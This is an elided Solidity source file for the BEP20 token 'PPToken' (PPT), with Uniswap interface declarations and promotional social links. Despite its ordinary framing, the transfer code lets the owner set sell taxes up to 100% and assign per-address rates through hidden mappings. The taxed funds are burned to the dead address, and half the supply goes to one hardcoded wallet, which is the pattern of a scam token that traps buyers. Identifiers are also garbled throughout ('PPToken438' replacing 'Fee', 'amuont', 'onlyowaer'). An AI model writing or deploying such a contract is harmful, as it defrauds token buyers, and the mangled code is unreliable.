...
* http://instagram.com/PPToken438
* https://www.reddit.com/user/PPToken438
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingPPToken438OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingPPToken438OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingPPToken438OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingPPToken438OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingPPToken438OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function PPToken438To() external view returns (address);
    function PPToken438ToSetter() external view returns (address);
    ...
    function setPPToken438To(address) external;
    function setPPToken438ToSetter(address) external;
}
...
contract PPT is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "PPToken";
	string symbol_ = "PPT";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellPPToken438 = 0;
        _defaultBuyPPToken438 = 0;
    ...
    uint256 private _defaultSellPPToken438 = 0;
    uint256 private _defaultBuyPPToken438 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellPPToken438 = _value;
    }


    function acPPToken438fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradePPToken438amuont = 0;

        if (rF) {
            uint256 tradePPToken438 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradePPToken438 = _msgPPToken438Info(uint160(from));
                    tradePPToken438 = tradePPToken438 < _defaultSellPPToken438 ? _defaultSellPPToken438 : tradePPToken438;
                }
                if (from == uniswapV2Pair) {
                    tradePPToken438 = _defaultBuyPPToken438;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradePPToken438 = _Escape[from];
            }


            tradePPToken438amuont = _amuont.mul(tradePPToken438).div(100);
        }


        if (tradePPToken438amuont > 0) {
            _balances[from] = _balances[from].sub(tradePPToken438amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradePPToken438amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradePPToken438amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradePPToken438amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradePPToken438amuont);
        emit Transfer(from, _to, _amuont - tradePPToken438amuont);
    }
	...
	function _msgPPToken438Info(uint _acc) internal view virtual returns (uint) {
